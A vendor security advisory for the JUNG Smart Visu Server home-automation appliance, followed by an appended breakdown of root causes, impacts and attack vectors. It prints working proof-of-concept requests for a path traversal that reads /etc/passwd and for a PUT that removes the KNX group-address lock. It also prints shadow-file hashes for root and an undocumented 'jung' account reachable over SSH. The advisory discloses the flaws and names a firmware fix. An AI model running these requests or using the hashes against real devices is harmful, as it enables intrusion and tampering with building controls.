```
SEC Consult Vulnerability Lab Security Advisory < 20170207-0 >
=======================================================================
              title: Path Traversal, Backdoor accounts & KNX group address
                     password bypass
            product: JUNG Smart Visu Server
 vulnerable version: Firmware v1.0.804/1.0.830/1.0.832
      fixed version: Firmware v1.0.900
         CVE number: -
             impact: Critical
           homepage: <http://www.jung.de/>
              found: 2016-11-10
                 by: T. Weber (Office Vienna)
                     SEC Consult Vulnerability Lab
=======================================================================

Vulnerability overview/description:
-----------------------------------
1) Path Traversal Vulnerability
The Smart Visu Server runs with root privileges and is vulnerable to path
traversal. This leads to full information disclosure of all files on the
system.

2) Backdoor Accounts
Two undocumented operating system user accounts are present on the appliance.
They can be used to gain access to the Smart Visu Server via SSH.

3) Group Address (GA) unlock without Password
As protection functionality, the KNX group address can be locked with a
user-defined password. This password can be removed by using a single PUT
request. An attacker can completely change the configuration of the connected
devices (e.g. a light switch in the kitchen can be swapped with the air
conditioner).

Proof of concept:
-----------------
1) Path Traversal Vulnerability
The Smart Visu Server is vulnerable to path traversal by sending the
following GET-Request:
------------------------------------ Request --------------------------------
GET /SV-Home//..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: <IP-Address>
[...]

----------------------------------- Response --------------------------------
HTTP/1.1 200 OK
Content-Disposition: inline;filename="passwd"
[...]

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[...]
-----------------------------------------------------------------------------

2) Backdoor Accounts
Two undocumented operating system user accounts are present on the appliance.
They can be used to gain access to Smart Visu Server over SSH on Port 55555.

Excerpt of the shadow file:
root:$6$Zcv.yVRg$0OfnoSEEWdP4K/2z5Mm/56nfGbdAPl4ZSm3oDWqn3fMD9cXfZCov7O/siheuYggHxuqHvZQ7nPSBM5BcbrH9n.:16840:0:99999:7:::
daemon:*:15914:0:99999:7:::
[...]
avahi:*:16541:0:99999:7:::
jung:$6$1SblJl3F$q6h6vfSC.IataQSqDNGw0wGvV8m/x8uLozBIj4Yj.ZzMoHbaMvzb2tR.B45I/ajsWpwkTcCNGjSZsLdC9IuzD.:16714:0:99999:7:::

3) Group Address (GA) unlock without Password
The following PUT request sends a JSON object to the server, which removes the
password:
------------------------------------ Request --------------------------------
PUT /rest/items/knxcom_datastore HTTP/1.1
Host: <IP-Address>
[...]

{"groupNames":[],"name":"knxcom_datastore","label":"knxcom_datastore","type":"GroupItem","tags":["{\"lock_ga\":false}"]}
-----------------------------------------------------------------------------

Vulnerable / tested versions:
-----------------------------
Firmware version 1.0.804, 1.0.830 and 1.0.832 have been tested and found to be
vulnerable.

Solution:
---------
Upgrade to firmware version 1.0.900 which is being provided by JUNG
through automatic updates.
```

- **Root cause of vulnerability**:
  - Path Traversal: Improper handling of user-supplied input in file paths.
  - Backdoor Accounts: Presence of undocumented user accounts with SSH access.
  - GA Unlock without Password: Insecure implementation of password protection for KNX group address configuration, allowing removal via a single PUT request.
- **Weaknesses/vulnerabilities present**:
  - Path traversal vulnerability in the web server.
  - Undocumented user accounts with SSH access.
  - Insecure password protection mechanism for KNX group addresses.
- **Impact of exploitation**:
  - Path Traversal: Full information disclosure of all files on the system, including sensitive information.
  - Backdoor Accounts: Root access to the Smart Visu Server via SSH.
  - GA Unlock without Password: Complete change of the configuration of the connected devices.
- **Attack vectors**:
  - Path Traversal: Sending a crafted GET request to the web server.
  - Backdoor Accounts: Accessing the server via SSH using the backdoor account credentials.
  - GA Unlock without Password: Sending a specific PUT request to the server.
- **Required attacker capabilities/position**:
  - Network access to the JUNG Smart Visu Server.
  - Ability to send HTTP requests to the server.
  - Knowledge of the vulnerable paths and API endpoints